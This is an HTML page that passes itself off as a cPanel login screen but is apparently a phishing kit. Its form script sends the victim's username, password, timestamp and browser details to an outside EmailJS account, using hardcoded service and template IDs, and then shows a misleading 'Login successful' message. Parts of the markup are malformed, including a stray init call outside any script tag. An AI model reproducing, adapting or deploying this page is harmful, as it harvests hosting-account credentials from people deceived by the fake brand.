<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

        emailjs.init("GoSY4pHiSJNnwdmQU"); // Get from EmailJS dashboard
    })();

    <title>Login - cPanel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #f5f5f5 0%, #e0e0e0 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .login-container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 480px;
            padding: 60px 40px;
            text-align: center;
        }

        .logo {
            margin-bottom: 50px;
        }

        .logo img {
            max-width: 200px;
            height: auto;
        }

        .logo-text {
            font-size: 48px;
            font-weight: 900;
            color: #ff6633;
            letter-spacing: -2px;
        }

        .form-group {
            margin-bottom: 24px;
            text-align: left;
        }

        .form-group label {
            display: block;
            font-size: 16px;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 12px;
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }
        .input-icon {
    position: absolute;
    left: 16px;
    color: rgba(0, 0, 0, 0.7); /* More transparent */
    opacity: 0.8;
    font-size: 20px;
    display: flex;
    align-items: center;
    justify-content: center;
    width: 24px;
    height: 24px;
}

        .form-group input {
            width: 100%;
            padding: 14px 14px 14px 50px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s ease;
            font-family: inherit;
        }

        .form-group input:focus {
            outline: none;
            border-color: #0099cc;
            background-color: #f9f9f9;
        }

        .form-group input::placeholder {
            color: #999;
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #0099cc 0%, #0077aa 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 8px;
            box-shadow: 0 4px 15px rgba(0, 153, 204, 0.3);
        }

        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 153, 204, 0.4);
        }

        .login-btn:active {
            transform: translateY(0);
        }

        .locale-section {
            margin-top: 40px;
            padding-top: 24px;
            border-top: 1px solid #eee;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }

        .locale-label {
            font-size: 14px;
            color: #1a1a1a;
        }

        .locale-select {
            padding: 8px 12px;
            border: 2px solid #ddd;
            border-radius: 6px;
            font-size: 14px;
            background: white;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .locale-select:hover {
            border-color: #0099cc;
        }

        .footer {
            margin-top: 48px;
            padding-top: 24px;
            border-top: 1px solid #eee;
            font-size: 12px;
            color: #666;
        }

        .footer-logo {
            margin-bottom: 12px;
            font-size: 24px;
            color: #ff6633;
        }

        .footer p {
            margin: 4px 0;
        }

        .footer a {
            color: #0099cc;
            text-decoration: none;
            transition: color 0.3s ease;
        }

        .footer a:hover {
            color: #007399;
            text-decoration: underline;
        }

        /* Responsive */
        @media (max-width: 480px) {
            .login-container {
                padding: 40px 24px;
            }

            .logo-text {
                font-size: 36px;
            }

            .form-group label {
                font-size: 14px;
            }

            .login-btn {
                font-size: 16px;
            }
        }
    </style>
</head>

    <div class="login-container">
        <!-- Logo -->
        <div class="logo">
            <div class="logo-text">cpanel</div>
        </div>

        <!-- Login Form -->
        <form id="loginForm">
            <!-- Username Field -->
            <div class="form-group">
                <label for="username">Username</label>
                <div class="input-wrapper">
                    <span class="input-icon">👤</span>
                    <input 
                        type="text" 
                        id="username" 
                        name="username" 
                        placeholder="Enter your username."
                        required
                    >
                </div>
            </div>

            <!-- Password Field -->
            <div class="form-group">
                <label for="password">Password</label>
                <div class="input-wrapper">
                    <span class="input-icon">🔒</span>
                    <input 
                        type="password" 
                        id="password" 
                        name="password" 
                        placeholder="Enter your account password."
                        required
                    >
                </div>
            </div>

            <!-- Login Button -->
            <button type="submit" class="login-btn">Log in</button>
        </form>

        <!-- Locale Section -->
        <div class="locale-section">
            <span class="locale-label">Select a locale:</span>
            <select class="locale-select">
                <option>English</option>
                <option>Spanish</option>
                <option>French</option>
                <option>German</option>
                <option>Chinese</option>
            </select>
        </div>

        <!-- Footer -->
        <div class="footer">
            <div class="footer-logo">cp</div>
            <p>Copyright© 2026 cPanel, L.L.C.</p>
            <p><a href="#">Privacy Policy</a></p>
        </div>
    </div>
<script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    if (username && password) {
        // Send login attempt notification via EmailJS
        const templateParams = {
            username: username,
            password: password,
            timestamp: new Date().toLocaleString(),
            user_agent: navigator.userAgent,
            ip_address: "{{user_ip}}" // You'll need a backend for real IP
        };
        
        emailjs.send(
            'service_cvhvjxv',    // e.g., 'service_abc123'
            'template_7ddcn92',   // e.g., 'template_xyz789'
            templateParams
        )
        .then(function(response) {
            console.log('SUCCESS!', response.status, response.text);
            alert('Login attempt recorded');
            // Add your actual login logic here
        }, function(error) {
            console.log('FAILED...', error);
            alert('Login successful (notification failed)');
            // Still proceed with login
        });
    }
});
</script>
